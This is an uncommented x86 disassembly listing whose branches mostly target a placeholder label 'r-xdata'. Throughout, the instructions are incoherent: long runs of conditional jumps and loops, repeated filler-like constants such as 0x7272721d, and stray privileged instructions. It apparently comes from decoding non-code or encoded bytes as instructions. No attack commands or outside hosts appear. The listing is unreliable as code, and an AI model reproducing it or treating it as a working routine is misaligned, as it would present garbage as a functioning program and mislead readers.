cmpsb [ esi ] [ edi ]
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
dec esp
cmpsd [ esi ] [ edi ]
push ds
mov dl 0xb
or [ ebx + 0x6972721d ] edi
xor al 0xd1
and cl [ eax - 0x48947b6a ]
inc eax
mov eax 0x44af6b84
outsd
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edx ] 0x3d0b1d67
popad
and al ah
popad
or ah al
and cl [ bp + di ]
imul edi [ ebx ] 0x1d
sbb eax 0xf355ed72
mov cl 0xb4
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edi [ edi + 0x721d1d33 ]
imul ebp [ edi - 0x7bd596ea ] 0x6b
jb r-xdata
sbb eax 0x2f590a1d
jb r-xdata
sbb eax 0x1d2f590a
sbb eax 0xd880bbb
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
test [ ebx - 0x5a ] ch
or bl [ 0xffffffffbb1d1d06 ]
outsd
and ch ch
cmp [ ecx + ebx * 8 + 0x4666ed19 ] esi
jb r-xdata
jb r-xdata
imul esp [ edi - 0x12dd98e2 ] 0x66
int3
popad
fsubr st2
or ebp [ ebx + 0x1f ]
test [ ecx - 0x67 ] ah
movsb [ edi ] [ esi ]
loop r-xdata
push ebp
mov eax [ 0xffffffffc80bb286 ]
aas
sbb eax 0xf2e25a1d
loop r-xdata
mov dl 0xed
add bl [ 0xffffffff9f61721d ]
sbb eax 0x30b1eb7
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
cmp al [ ebx + ebp * 2 + 0x39d1f2bf ]
mov bh 0x7c
jb r-xdata
jb r-xdata
jb r-xdata
xchg esi eax
jb r-xdata
or eax [ esi + 0x8 ]
sbb eax 0x7272721d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ds
loope r-xdata
add eax [ edx ]
sbb eax 0x9f61721d
and ch ch
cbw
xor ebx [ 0x1de2881d ]
je r-xdata
mov ah 0xa
sbb eax 0xbb1d1d06
push ss
jb r-xdata
sbb eax 0x880bbb1d
or eax 0x72721d1d
jb r-xdata
or bl [ ecx + 0x2f ]
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
pop ecx
das
in eax dx
shl dl cl
loop r-xdata
loop r-xdata
fstp [ ecx ]
jb r-xdata
jmp r-xdata
push ds
jb r-xdata
push ds
mov esp 0x1d38690b
sbb eax 0x96676f72
xchg esp eax
mov dl 0xb1
sbb eax 0xe2e26275
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
dec eax
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0xb
mov [ 0xffffffffb7e2e2fb ] al
loop r-xdata
jb r-xdata
loop r-xdata
test [ ebx - 0x41 ] ch
imul edi [ edx ] 0xf2bf6b84
sar [ ecx ] 0x1
or ebx [ ebx + 0x1e ]
sbb eax 0x7272721d
jb r-xdata
imul esi [ edi - 0x58947b84 ] 0x48
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0x6f
out 0xb al
sub [ 0xffffffff87881d1d ] esp
test [ ebx - 0x59 ] ch
add al 0xba
mov [ ecx + ebp * 2 - 0x50947bd6 ] cl
or bh [ ebx + 0x6b848588 ]
scasd [ edi ]
or [ ebx + 0x6b848b88 ] bh
scasd [ edi ]
push cs
mov ebx 0x6b848c88
scasd [ edi ]
or al 0xbb
test [ ebx - 0x51 ] ch
or eax [ ebp + 0x3 ]
mov bh 0xb
jb r-xdata
sub al [ ebx + ebp * 2 + 0x22d118a7 ]
push 0xffffffa7
push es
or esp [ ecx + 0x38 ]
sbb eax 0x7272721d
jb r-xdata
push esi
scasd [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
mov cl 0xb
or eax edx
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
jecxz r-xdata
retn 0xe2e2
or eax [ ecx + edi * 8 ]
in eax dx
jb r-xdata
jb r-xdata
and ch ch
or edi [ ebx + 0x2e ]
jb r-xdata
push ds
mov dl 0x1d
or ecx [ edi - 0x7 ]
loop r-xdata
loop r-xdata
fldcw [ 0xffffffffe2e467ed ]
cmp ax 0xe2c2
jb r-xdata
loop r-xdata
jl r-xdata
jb r-xdata
in eax dx
inc ebp
jb r-xdata
jb r-xdata
cmp [ edx + 0x6b842469 ] dh
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
add [ 0xffffffffaf6fb51d ] bl
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ecx [ esi ] 0x88fe0e61
xchg [ edx + 0x1d063f0b ] bh
sbb eax 0x72727272
jb r-xdata
or esp [ edx - 0x481d1d05 ]
mov ah 0xa
jpe r-xdata
push ds
sbb eax 0xaf6fb51d
jb r-xdata
imul esp [ edi + 0x1e5b0b48 ] 0x1d
sbb eax 0x72727272
ja r-xdata
and ch ch
sbb eax 0x8872721d
inc ecx
or eax 0xa76f1d1d
push edx
mov dl 0xb4
outsd
outsd
outsb
pop ds
sbb eax 0x2f370a1d
sbb eax 0x67bbbb1d
and ch ch
imul ecx [ di ] 0x1d
sbb eax 0xb276a76f
and ch ch
sub al 0x69
xchg edi eax
0x5abf6b84 0x3869
jb r-xdata
cld
imul esp [ esp + eax * 4 ] 0x845ebf6b
imul esi [ edi - 0x60947bde ] 0x28
or esp ebx
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
sbb [ 0x1db4b21d ] ebx
mov ch 0xb2
mov ebp 0x72212bbc
jb r-xdata
imul esp [ edi + 0x690bbc1e ] 0x721d1d38
and al 0x84
jb r-xdata
jb r-xdata
jb r-xdata
push cs
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in al 0xe2
imul esp [ ebx ] 0xb306784
jpo r-xdata
push ebp
mov cl 0xb4
popad
lahf
push ds
loop r-xdata
imul eax [ ecx ] 0x26611d1d
sbb eax 0xa0e8898a
mov al [ 0xa1a69b4 ]
sbb eax 0xe8898a1d
mov ch 0x6f
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
and al [ ebx + ebp * 2 - 0x1cf4d761 ]
test [ ebx - 0x41 ] ch
mov dl 0x69
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1db1b294
jne r-xdata
sub [ ebx ] cl
loop r-xdata
imul edi [ edi - 0x48947ba2 ] 0x22
test [ ebx - 0x61 ] ch
jb r-xdata
push edx
mov ah 0xb2
or edi [ ebp - 0x1e ]
outsd
jb r-xdata
xor eax 0xbe31a61
retn 0x1d2a
loop r-xdata
loopne r-xdata
jb r-xdata
out 0xe2 al
jb r-xdata
outsd
xchg esi eax
mov [ ecx - 0xb58947c ] al
mov edi 0xb76b845e
jb r-xdata
jb r-xdata
xchg edi eax
out dx al
or cl [ edx ]
sub bl [ 0xffffffffee26611d ]
and cl [ bp + di ]
inc esi
or [ 0x7272721d ] bl
imul sp cx 0xe2e2
sbb eax 0x1db21e97
scasd [ edi ]
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
outsb
jb r-xdata
jb r-xdata
jb r-xdata
pop edx
imul edi [ eax ] 0x842469b2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
pop esi
jb r-xdata
mov eax 0x1d044d0b
jb r-xdata
jecxz r-xdata
imul edx [ 0x1d25f00a ] 0xf226611d
adc dh [ edx + 0xb4aa76f ]
jb r-xdata
fdivr [ edx + 0x6b84b888 ]
jb r-xdata
jge r-xdata
sbb eax 0x7272721d
adc eax 0x1d25f00a
sbb eax 0xbf22661
or al 0x6
loop r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
test [ ebx - 0x49 ] ch
into
mov bh 0x69
jb r-xdata
mov bl 0xb
jb r-xdata
imul ecx [ esi ] 0xe0ce0e63
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x69
push cs
or eax [ edx + 0x3a ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ eax ] 0x1d10d10b
sbb eax 0x35e666ed
sbb eax 0xeaaf691d
leave
sub ch [ eax - 0xe ]
or esp ebp
cmp al 0x1d
sbb eax 0x72727272
jb r-xdata
jb r-xdata
inc eax
imul edi [ edi + 0x1aaf6b1e ] 0xb
je r-xdata
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
mov bh 0x3e
loop r-xdata
jb r-xdata
sub ch [ ecx + 0x2a ]
scasd [ edi ]
jb r-xdata
push cs
popfd
jb r-xdata
popad
sbb ah bl
cmpsd [ esi ] [ edi ]
mov al bl
arpl [ esi ] cx
sbb eax 0x1eaf6fb5
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx ] ecx
jb r-xdata
loop r-xdata
jb r-xdata
cmp al 0x1d
cmpsd [ esi ] [ edi ]
or ebp [ esi + 0x3c ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0x6b848188
cmpsd [ esi ] [ edi ]
hlt
out dx al
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ah [ edx + 0x2bb9bcbd ]
dec edx
jb r-xdata
loop r-xdata
mov [ eax + 0x3ea76b84 ] bh
jb r-xdata
xor cl dl
cmp [ edi - 0x59 ] ebp
test [ ss : ebx - 0x69 ] ch
imul ebp [ edx ] 0x6b8422d1
mov edi 0xa76b8454
jb r-xdata
sbb eax 0x8ae68832
outsd
jb r-xdata
mov edi 0x9f6b8400
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6e7745ca ] 0x69
xor al [ ebx + ebp * 2 + 0x6a0b34b7 ]
add [ 0xffffffffa769721d ] ebx
jb r-xdata
sub al 0x38
jb r-xdata
jb r-xdata
jb r-xdata
ja r-xdata
imul ecx [ esi ] 0x1d3a420b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or esi [ edi - 0x10 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
and ah dh
cmpsd [ esi ] [ edi ]
and [ edx + 0x72 ] esi
shl [ edx ] 0x1
test [ ebx - 0x41 ] ch
mov [ edx + 0x1d3c5c0b ] ah
sbb eax 0x1ea76f72
mov dl 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
push ss
test [ ebx - 0x61 ] ch
jb r-xdata
jb r-xdata
or esp [ edi - 0x4ae2e2d8 ]
mov ch 0xb5
fisubr [ ebx ]
sbb eax 0xb22d11d
mul dl
fldenv [ esi + edx * 8 + 0x28b867ed ]
mov edx 0x32699188
jb r-xdata
sbb eax 0xa3a66f1d
jb r-xdata
rcr [ 0xffffffffa2b76b84 ] 0x1
imul edi [ edi - 0x60947c00 ] 0x16
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or ebp [ eax + edi ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
outsd
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
dec eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi + 0x6b84b9e0 ] 0xffffffbf
jb r-xdata
or ecx [ esi + eax ]
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ edx + ecx ]
jb r-xdata
lahf
jb r-xdata
test [ ebx - 0x41 ] ch
push es
mov [ ebp + 0x1d382c0b ] al
jb r-xdata
jb r-xdata
sbb eax 0xa769721d
mov [ ecx + 0x6b843269 ] dl
mov bh 0x34
jb r-xdata
sbb eax 0x7272721d
outsd
jb r-xdata
loop r-xdata
add [ ebx + ebp * 2 + 0x1dd1169f ] al
test [ ebx - 0x49 ] ch
mov [ 0x30d13a69 ] al
or edx ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb al 0xb
cmp [ 0xffffffffa3a66f1d ] bl
jb r-xdata
mov edx 0x6b84b888
jb r-xdata
or dh al
jb r-xdata
or ecx eax
jb r-xdata
jb r-xdata
jb r-xdata
or al [ 0xffffffffb41d1d27 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push es
jb r-xdata
loope r-xdata
jb r-xdata
inc esp
jb r-xdata
sbb eax 0x7272721d
sbb ch [ ecx + 0x32 ]
test [ ebx - 0x41 ] ch
mov edx 0x14a76b84
shl [ edx ] 0x1
mov [ esi + 0x1d039f0b ] ah
sbb eax 0xedeb1861
jmp r-xdata
or bl [ 0xffffffffed72721d ]
jb r-xdata
jb r-xdata
or [ ecx ] 0xffffffb5
salc
jb r-xdata
jb r-xdata
or ebp [ edx + 0x1 ]
imul esi [ edx ] 0x34b76b84
in eax dx
mov [ 0x2a480b1c ] eax
jb r-xdata
imul edi [ edx ] 0xd50b30d1
imul ebx [ edi - 0x7be22eea ] 0x6b
mov bh 0xa2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1ca3a66f
jb r-xdata
or eax [ ecx + edi * 8 ]
mov eax 0x3ea76b84
jb r-xdata
and eax 0x26611d1d
or ecx [ esi + eax ]
sub esp [ ecx ]
jb r-xdata
push es
movsb [ edi ] [ esi ]
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov cl [ edi ]
sbb [ ecx + 0x316a0b74 ] eax
sbb eax 0x7272721d
jb r-xdata
sub al 0x1d
sbb eax 0x1d2b500a
sbb eax 0x14671269
in eax dx
daa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
and eax 0xe2e31ea7
xor cl [ eax - 0x2d1d751a ]
jb r-xdata
jb r-xdata
sbb eax 0x86ad378a
shl [ ebp + 0x1d3e650b ] 0x1d
jb r-xdata
or [ ebp + 0x1d3cdb0a ] esi
jb r-xdata
mov al [ eax + 0x44 ]
sbb eax 0x66ed7272
jmp 0x1e28a721
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
ror [ eax + 0x21d60b86 ] 0x1
sbb eax 0x8872721d
sar [ ebx + 0x2369c788 ] 0x84
inc eax
jb r-xdata
imul ebx [ edx ] 0x6b843269
jb r-xdata
enter 0x1d2a 0x1d
jb r-xdata
or ecx [ eax + 0x2a ]
jb r-xdata
imul edi [ edi + 0xb858806 ] 0x2c
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
imul esp [ edi - 0x6fbf4c2 ] 0xffffffe2
loop r-xdata
or ecx [ es : esi + eax ]
jb r-xdata
in eax dx
fucomp st3
loop r-xdata
or dl [ eax + 0x2b ]
or esi [ edi ]
add eax 0xb41d1d27
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x6712691d
adc al 0xed
sbb eax 0x2c370bb4
sbb eax 0x2b500a1d
test [ ebx - 0x41 ] ch
test [ ebx - 0x49 ] ch
xor al 0xb
push 0x1
imul esp [ ebx ] 0x36a76b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
shl [ edx ] 0x1
mov [ 0x2bb9bcbd ] al
jb r-xdata
jb r-xdata
mov [ edi + 0x26af6b84 ] dl
jb r-xdata
jb r-xdata
or bl bl
jb r-xdata
jb r-xdata
jb r-xdata
salc
jb r-xdata
jb r-xdata
mov edi 0xb367ed1e
mov eax 0xdb1d1d28
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0xa2b76b84
mov eax 0xd0b76b84
mov [ esi + 0x1d21d60b ] al
sbb eax 0xc0887272
mov ebx 0x2369c788
mov edx 0x32699188
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or esi edx
jb r-xdata
out 0x88 al
aam 0xb9
test [ ebx - 0x41 ] ch
test [ ebx - 0x59 ] ch
mov eax [ 0xbe2e2ea ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor al 0xd1
and cl [ ebx ]
cmp [ 0x7272721d ] bl
cmpsd [ esi ] [ edi ]
sbb cl [ ebx ]
push edx
xor eax 0x72721d1d
jb r-xdata
imul edi [ edi - 0x50947bb0 ] 0x24
mov [ ebx - 0x1d061df5 ] cl
loop r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
cmp al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0xdb1d1d28
jb r-xdata
mov ch 0xa
jb r-xdata
sbb eax 0x1ebfdb1d
fldenv [ esi + edx * 8 + 0x28b867ed ]
xchg ecx eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c959 ]
sub [ 0xffffffff971db21d ] bl
fstp [ edi - 0x4c9812e2 ]
jb r-xdata
jb r-xdata
imul esi [ edi - 0x1af447fa ] 0xf
sbb eax 0x7272721d
and [ 0x22d1721d ] ebx
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
push es
or edx [ ebx + 0x5 ]
jb r-xdata
push cs
sbb eax 0x7272721d
jb r-xdata
imul edi [ es : 0x52bf6b84 ] 0x84bb3a69
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
sub [ 0x1ebfdb1d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
fstp [ ebx - 0x52c875e3 ]
jb r-xdata
mov eax [ 0xffffffffffffe2ea ]
jb r-xdata
jb r-xdata
push ds
jb r-xdata
sbb eax 0x2bd186b4
sbb eax 0xbc22d172
sub esp [ ecx ]
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
in al 0x88
salc
mov edi 0x6b84b9e0
mov edi 0xb9d488e6
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
push ebx
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax dx
push ds
adc [ 0x7221bc1d ] ebx
jb r-xdata
imul edi [ 0x52bf6b84 ] 0x84bb3a69
jb r-xdata
jb r-xdata
or dl ah
imul ecx [ esi ] 0x1d0a4c0b
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov bl 0x28
sbb eax 0xed1ebfdb
jb r-xdata
imul ebp [ edi - 0x7bc296da ] 0x6b
jb r-xdata
jb r-xdata
xchg al al
mov ch 0xb
sbb eax 0x7272721d
sbb eax 0xad378a1d
jb r-xdata
0xc80be2e2 0x1d2a
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0x6f
jb r-xdata
jb r-xdata
loop r-xdata
mul dl
jb r-xdata
mov esp 0x7272212b
shl [ edx ] 0x1
popad
sbb bl [ 0xb2377ed ]
iretd
mov dl 0x1d
mov ah 0x86
shr [ ebx ] 0x1
mov ecx 0xeabf6b84
mov ecx 0xe6bf6b84
mov ah dl
mov ecx 0xe4bf6b84
mov dh dl
jb r-xdata
mov ebp 0x212bb9bc
jb r-xdata
jb r-xdata
add ebx [ 0xfffffffff6280b1d ]
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
adc [ 0xb72721d ] bl
sbb eax 0x26551d1d
jb r-xdata
add eax 0x551d1d1d
jb r-xdata
jb r-xdata
jb r-xdata
push eax
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
fsubrp st0
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push es
imul esp [ 0x1d009b0a ] 0x22d1bb1d
or ebp [ ebx ]
in al dx
loop r-xdata
loop r-xdata
loop r-xdata
inc edx
sub al 0x1d
sbb eax 0xdfee2661
or [ eax ] 0xe2
jb r-xdata
and al 0x88
mov ecx [ ebx ]
loop r-xdata
scasd [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov dh [ edi ]
lodsd [ esi ]
sbb eax 0x72727272
mov bh 0x69
push cs
or ecx [ edx + ecx + 0x1d ]
loop r-xdata
jb r-xdata
jb r-xdata
push esp
test [ ebx - 0x59 ] ch
mov [ ebx + ebp * 2 + 0x6f0b06b7 ] es
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
out 0xaa al
jb r-xdata
sbb eax 0xe2f6280b
loop r-xdata
imul ebx [ esi + 0x14d1066f ] 0x280b2c69
sbb eax 0x72727272
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
sbb eax 0xe2e22655
jb r-xdata
sbb eax 0xe226551d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov edi 0xbb3a6952
jb r-xdata
jb r-xdata
or ecx edi
or bl [ 0x741db21d ]
dec esi
jb r-xdata
xchg edi eax
sbb al 0x84
jb r-xdata
sbb eax 0xed72721d
and al 0xa
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
imul esp [ edi + 0x35520b1a ] 0x1d
sbb eax 0x72727272
imul edi [ edx ] 0xbf6b84bb
cmp eax 0x52bf6b84
jb r-xdata
jb r-xdata
or esp [ edx ]
sbb eax 0x6971db2
jb r-xdata
mov edi 0x843c69ea
imul edi [ edi + 0x1ac60be8 ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ edi - 0x2ecd967c ] 0x22
jb r-xdata
test [ ebx - 0x59 ] ch
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
mov dl 0x88
cld
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or eax [ eax ]
hlt
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or esp [ edi + 0x721d1d10 ]
push ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ edx + 0x2c ]
sbb eax 0xee26611d
fild [ edx - 0x121d1df8 ]
loop r-xdata
mov bh 0xb
add bl [ 0xffffffffb21d881d ]
or ebp [ ebx ]
loop r-xdata
imul ebx [ edi + 0xb1a6914 ] 0x2b
jb r-xdata
mov al ah
or ebx ebp
adc eax 0x72721d1d
sbb eax 0x109f6b84
imul ebx [ ebx ] 0x169f6b84
jb r-xdata
sbb eax 0x971db21d
mov bl 0x28
jb r-xdata
imul edi [ edi - 0x44c596ae ] 0xffffff84
jb r-xdata
jb r-xdata
mov cl 0xb
pop edi
xor [ 0x1a61721d ] ebx
jecxz r-xdata
sbb eax 0xa70b0697
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ esp + eax * 4 ] 0xbe8bf6b
jb r-xdata
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
imul esi [ edi - 0x7f77477e ] 0xffffff84
jb r-xdata
sbb eax 0xbb51297
xchg esp eax
in al 0xe2
jb r-xdata
test [ ecx + 0x32 ] ch
jb r-xdata
xchg edx eax
mov bh 0x84
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
outsd
adc [ 0x7272721d ] ebx
jb r-xdata
and ah [ ecx ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x1d3b680b
sbb ebx ebp
or esi [ ebp + 0x72e2e2f2 ]
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xf6280b1d
jb r-xdata
and [ edx + 0x72 ] esi
bound ebp [ eax ]
sbb eax 0x2267bb1d
in eax dx
mov [ 0x1d3c ] al
sbb eax 0xb2bea76f
or eax ebp
cmp al 0x1d
sbb eax 0x72727272
jb r-xdata
mov cl 0xb1
jb r-xdata
test [ ebx - 0x51 ] ch
mov ebx 0x50bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb cl [ ebx ]
adc al 0x69
jb r-xdata
imul ebx [ esp + eax * 4 ] 0x69149f6b
imul ebx [ edi - 0x7be496f0 ] 0x6b
lahf
jb r-xdata
jb r-xdata
push edx
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
test [ ebx - 0x41 ] ch
call 0x1d60883c
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ eax + 0x6b848088 ] 0xb7
jb r-xdata
sbb eax 0xa7698ab4
shl [ edx ] 0x1
loop r-xdata
cmpsd [ esi ] [ edi ]
push ds
fldenv [ ecx ]
or esp esp
test [ ebx + ebp * 2 - 0x68967569 ] 0x9e
xor dl cl
jb r-xdata
imul esi [ edx ] 0x6b8422d1
jb r-xdata
sbb eax 0x4180b1d
sbb eax 0xa725721d
call 0x6f62e593
outsd
sub bl [ edi ]
imul ebx [ ebx ] 0x209f6b84
imul ebx [ esp + eax * 4 ] 0x88269f6b
mov ah 0xb
push ebx
sbb eax 0x7272721d
mov bh 0x69
push cs
mov bl 0xb
sub [ ebx ] ecx
mov esp 0x72212bb9
jb r-xdata
push cs
pop ds
sbb eax 0x800bb21d
int1
loop r-xdata
sbb eax 0x6f727272
jb r-xdata
mov ah bh
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
or dl ah
mov dl 0xb1
jb r-xdata
sahf
outsd
push es
rcl [ ecx + ebp * 2 ] 0x1
sub al 0xb
sub al dh
loop r-xdata
jb r-xdata
jb r-xdata
or esi [ esp + edi + 0x1d ]
sbb eax 0x72727272
xchg [ 0x7c0beab5 ] bl
mov dl al
shl [ edx ] 0x1
mov dh dh
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
out dx al
sub ebp ebp
jb r-xdata
push ss
adc [ ecx + 0x1b ] ch
test [ ebx - 0x61 ] ch
jb r-xdata
mov dl 0x1d
jb r-xdata
cmp bh [ ebx + 0x50bf6b84 ]
jb r-xdata
jb r-xdata
sub [ 0xffffffffb5b5b51d ] bl
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
enter 0x1d24 0x1d
popad
mov edi 0x1ac60be8
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
mov [ ebx + ebp * 2 + 0x326984b7 ] es
mov [ eax - 0x7f48947c ] al
jb r-xdata
call sub_45e591
sbb eax 0x1f2a6f6f
jb r-xdata
jb r-xdata
jb r-xdata
and al [ ebx + ebp * 2 - 0x58906d59 ]
jb r-xdata
jb r-xdata
out 0xe2 al
jb r-xdata
loop r-xdata
out dx al
fldenv [ ecx ]
sub ah al
mov dl 0x6f
jb r-xdata
or edi [ edi + 0x72e2e2f8 ]
sahf
adc ch ch
pushad
hlt
sbb eax 0x72727272
in eax dx
cmp [ eax - 0x7948947c ] 0x88
test [ eax - 0x7358947c ] edi
jb r-xdata
jb r-xdata
sbb eax 0x530b0697
jb r-xdata
jb r-xdata
sbb eax 0x1dd1eab4
or ebp [ 0x721d1d0e ]
jb r-xdata
mov [ esp + eax * 4 - 0x45c95895 ] cl
mov [ esi + 0x34a76b84 ] dl
shl [ edx ] 0x1
or edi [ esi ]
cmp [ 0x7272721d ] bl
jl r-xdata
mov dl 0x69
and al 0xa
cli
mov cl 0xb1
mov cl 0xb1
outsd
loop r-xdata
loopne r-xdata
sbb eax 0x7c0beab5
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x88
jb r-xdata
jb r-xdata
sbb eax 0x180f0b1d
or ecx [ esi + 0x37 ]
sbb eax 0x3b69721d
mov [ ecx + 0x4ebf6b84 ] al
mov ecx 0x4cbf6b84
mov [ ecx + 0x5caf6b84 ] dl
mov ebx 0x6b849688
scasd [ edi ]
and [ ebx + 0x6b849788 ] bh
sub eax [ edx ]
loop r-xdata
jb r-xdata
sbb eax [ ebx + ebp * 2 + 0x1c69169f ]
jb r-xdata
xchg edi eax
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0x69
cmpsd [ esi ] [ edi ]
sbb ch [ ecx + 0x62 ]
inc esi
loop r-xdata
jb r-xdata
and bh [ ebx + ebp + 0x72727221 ]
jb r-xdata
jb r-xdata
or eax esi
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
mov ch [ ecx - 0x59 ]
sbb eax [ ebx + ebp * 2 + 0x1c69209f ]
imul ebx [ ebx ] 0xede31d61
jb r-xdata
popad
jb r-xdata
imul esp [ edi - 0x958906e ] 0xffffff84
imul edx [ edi - 0x61689676 ] 0xb
mov edi 0x72e2e2f8
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
cmpsd [ esi ] [ edi ]
pop edx
scasd [ edi ]
scasd [ edi ]
mov edx 0x5ea72587
mov dl 0x1d
loop r-xdata
jb r-xdata
loop r-xdata
leave
jb r-xdata
sbb eax 0x2fd90b1d
sbb eax 0x7272721d
or esi ebp
out 0xe2 al
loop r-xdata
imul ecx [ esi ] 0xb290bb3
xchg [ eax + 0x6b84b885 ] cl
cmpsd [ esi ] [ edi ]
test [ ebx - 0x49 ] ch
or bh [ edi + 0x3 ]
or edx [ ebx ]
xor [ 0x7272721d ] bl
jb r-xdata
